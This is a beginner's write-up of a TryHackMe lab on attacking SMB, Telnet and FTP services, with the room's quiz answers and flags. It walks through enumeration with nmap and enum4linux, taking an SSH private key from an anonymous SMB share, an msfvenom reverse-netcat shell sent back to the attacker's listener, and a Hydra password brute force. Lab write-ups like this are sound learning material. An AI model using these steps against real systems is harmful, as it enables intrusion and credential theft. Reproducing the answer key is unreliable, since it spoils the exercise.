Write up for Complete Beginner path on THM.
********************************************
Network Services
********************************************

SMB
****

SMB stands for Server Message Block and is a protocol used for sharing files, printers and serial ports on a network. It works by sharing information with a client and a server.

Allows a User to access files on the the system remotely by using a specific set of commands once a connection is made using the SMB service.

********************************************************************************

What does SMB stand for?

A: Server Message Block

What type of protocol is SMB?

A: Response-Request

What do clients connect to servers using?

A: TCP/IP $(TCP stands for transfer control protocol and uses a "three-way handshake". This means that both the client and the host must establish a connection with each other in order to communicate.)

What systems does Samba run on?

A: unix $(Samba is a server application(?) that is used to host information to other clients. Used to make websites, it is free and open-source making it a popular choice.)
********************************************************************************

Enumerating SMB
***************

Enumeration is the information gathering step in an attack. Looking for open ports or vectors of attack using scans like Nmap which scans open ports on a system.

We already know that we are looking for an SMB share so it will be running on a TCP port.

So the first step was to use nmap on the given IP address, using the command:

nmap -sC -sV -p 1-5000 $IPADDRESS

the -sC tack is the default script used to scan a system. -sV allows us to probe any open ports for the service and version info. Finally i used -p 1-5000 to list the ports that I want to scan. Most open ports that are commonly used by protocols are found in the first 1000 ports, however smarter admins will know to hide vulnerable ports on less used ports.

In the write up it also explains a bit about a tool called "Enum4Linux", so I decided to use that as well.

Using the command enum4linux -P $IPADDRESS it let me know that it accepted the generics password "password". It also let me know know that the domain name was WORKGROUP as well as known usernames.

With these two quick scans I was able to answer the next set of questions.

Conduct an nmap scan of your choosing, How many ports are open?

A: 3 (These were ports 22/TCP - ssh, 139/tcp - smdb 3.X - 4.X and 445/tcp smdb 4.7.6-Ubuntu the last 2 being a part of the workgroup "WORKGROUP")

What ports is SMB running on?

A: 139/445

Let's get started with Enum4Linux, conduct a full basic enumeration. For startes, what is the workgroup name?

A: workgroup (discovered in both the NMAP and Enum4Linux scans)

What comes up as the name of the machine?

A: POLOSMB (Again found in both my scans, also known as "Host" name.)

What operating system version is running?

A: 6.1 (This was found in the Nmap scan under smb-os-discovery, it was a Windows 6.1)

What share sticks our as something we might want to investigate?

A: profiles (This was something I had to go back for using the command enum4linux -S $IPADDRESS to access the actual shares that were available.)
*****************************************************************************

Exploiting SMB
***************

In the description, it explains that you can use something like remote code execution to exploit SMB, a much more common attack vector is the misconfiguration of the anonymous login option. I recall seeing this option when working with SMB in my Linux class. It is a yes or no option in the SMB .conf file.

To login to the SMB share we use the command:
smbclient //$IP/$Share -U $Username -p $port

Using the command:
smbclient //$IP/profiles -U anonymous -p 139

I gained access to the smb share by leacing the password blank.

Once I had access i used the "ls" command and noticed a .txt titled "Working From Home Information" that stuck out

This part actually had me stuck for a bit. Because im using Parrot OS (linux) and this is a windows share, the spaces caused issues when trying to read the file. It did not allow me to download it using get or mget. To read the file I had to use the "more" command and place the name of the file in quotes.

In the .txt file it explained that the company is using SSH because they are trying to move to work from home. They also provided the users name "John Cactus" and the department managers name "James"

Now we know to check the .ssh folder. Navigating there we see id_rsa folder.

I downloaded the file using the command: get id_rsa

In the writeup it explains how to change permissions on the folder to allow us to open the key.

chmod 600 id_rsa

Now we needed to know the username for the ssh login, for this I used the Enum4Linux tool once again with the -r tag to see if it could find the username being used. It found a user named "cactus".

After a quick look at the man page for SSH I discovered in order to use the RSA key that I downloaded we use the command:

ssh cactus@$IPADDRESS -i id_rsa

The tack -i is where we put the location of the RSA key, which was already in the PWD I was in.

Now we have SSHd into the system.

using ls, we find the smb.txt file. Using cat we get our flag: THM{smb_is_fun_eh?}


What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port?

A: smbclient //10.10.10.2/secret -U suit -p 139

Does the share allow anonymous access? Y/N?

A: y

Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?

A: John Cactus

What service has been configured to allow him to work from home?

A: ssh

Okay! Now we know this, what directory on the share should we look in?

A: .ssh

This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?

A: id_rsa

What is the smb.txt flag?

A: THM{smb_is_fun_eh?}

*******************************************************************************
Telnet
********

Telnet is basically the older version of SSH. It allows a user to remotely connect to a host. It does not encrypt its traffic and therefore is not used in a modern setting.

The syntax to use Telnet is:

telnet $IP $port


What is Telnet?  

A: application protocol


What has slowly replaced Telnet?   

A: ssh


How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?

A: telnet 10.10.10.3 23


The lack of what, means that all Telnet communication is in plaintext?

A: encryption
*******************************************************************************

Enumerating Telnet
***********************

Using the same Nmap scan as before I discovered that the first 5000 ports where closed. This is a way Admins will attempt to hide open ports. I decided to scan ports 5000-10000.

The only port that was opened was port 8012/TCP. I noticed that something names "Skidy's Backdoor" was mentioned in the scan.


How many ports are open on the target machine? 

A: 1

What port is this?

A: 8012

This port is unassigned, but still lists the protocol it's using, what protocol is this? 

A: TCP

Now re-run the nmap scan, without the -p- tag, how many ports show up as open?

A: 0

Based on the title returned to us, what do we think this port could be used for?

A: a backdoor

Who could it belong to? Gathering possible usernames is an important step in enumeration.

A: Skidy
*******************************************************************************
Exploiting Telnet
******************

First step was to telnet into the host using the command:
telnet $IP $port

Once inside there is a welcome message that says "Skidy's Backdoor"

However it does not allow me to execute any commands. The write up suggested starting a tcpdump on my local machine.

Using the Telnet session I ping my local host and receive a response.

It then gives us the command to use msfvenom to generate a reverseshell.

"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"

-p = payload
lhost = our local host IP address (this is your machine's IP address)
lport = the port to listen on (this is the port on your machine)
R = export the payload in raw format

This generates the command that we copy/paste into the telnet session to tell it to send back to our local machine that is listening on port 4444 with netcat to grant access to the remote machine.

That is called a reverse shell. We have direct access to the remote machine through the payload that we have placed in the telnet session. There is a lot going on here that will most likely be covered more in depth at a later point.

Now that we have remote code execution available to the target, we simply use the ls command on out netcat listener that has achieved the reverseshell and it returns the file that we are looking for, we then cat that file (flag.txt) and get our flag:
THM{y0u_g0t_th3_t3ln3t_fl4g}


Great! It's an open telnet connection! What welcome message do we receive?

A: Skidy's Backdoor

Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)

A: n


Now, use the command "ping [local THM ip] -c 1" through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)

A: y


What word does the generated payload start with?

A: mkfifo

What would the command look like for the listening port we selected in our payload?

A: nc -lvp 4444

Success! What is the contents of flag.txt?
A: THM{y0u_g0t_th3_t3ln3t_fl4g}
*******************************************************************************

Understanding FTP
*******************

FTP is a client-server protocol. Used to transfer files over a network. Can also be used to relay commands to the hosting system.

Uses two channels, the command channel is used for transimitting commands and replies. The data channel is used for transferring data.

Client would open up a connection with the server, the server validates the clients credentials and provides a session.

There are active FTP connections and passive FTP connections.


What communications model does FTP use?

A: Client-Server


What's the standard FTP port?

A: 21

How many modes of FTP connection are there?  

A: 2

*******************************************************************************

Enumerating FTP
****************

Using Nmap is standard practice for enumeration, in this example it is mentioned that careless setup of the FTP server allows anonymous login which we will use to exploit this system.

Our Nmap scan revealed that FTP is open on the standard port 21, it seems to be the only port open (at least in the first 5000 ports).

I then login using the command "FTP $IPADDRESS" and notice there is a single .txt file which I download using the get command.

It does not have any super vulnerable information other than that the admins name is "Mike" and that they are doing routine system maintenance over the weekend.

This made me realize that there must be more ports open in order to access any flags so I redo the port scan with all ports (-p-). After scanning again, port 80 showed up with appache httpd running.



How many ports are open on the target machine? 

A: 2

What port is ftp running on?

A: 2

What variant of FTP is running on it?

A: vsftpd

What is the name of the file in the anonymous FTP directory?

A: PUBLIC_NOTICE.txt

What do we think a possible username could be?

A: Mike

*******************************************************************************

Exploiting FTP
****************

In the writeup it explains that now that we have a possible username we want to use a tool called "Hydra" to bruteforce out way in with better credentials. The command given is "hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp"

after changing the username to mike, hydra found the password was the super secure password of "password" :)

now we attempt to login to ftp using these credentials..

and success, in the directory we found a .txt file called "ftp.txt" and after downloading it and using cat, we have our flag.
THM{y0u_g0t_th3_ftp_fl4g}


What is the password for the user "mike"?

A: password

What is ftp.txt?

A: THM{y0u_g0t_th3_ftp_fl4g}


This concluded the network services part 1 portion. 

I have run through this before but it had been quite awhile, it was good to refresh my memory and how to exploit these services. my biggest challenge was remember how to operate this services and the commands used to login. For example i had tried things like "vsftpd $IPADDRESS" to login when it was simply "ftp $IPADDRESS". also the diffrent types of commands to download such as "get" and "mget". Using hydra was also something I have not done often.










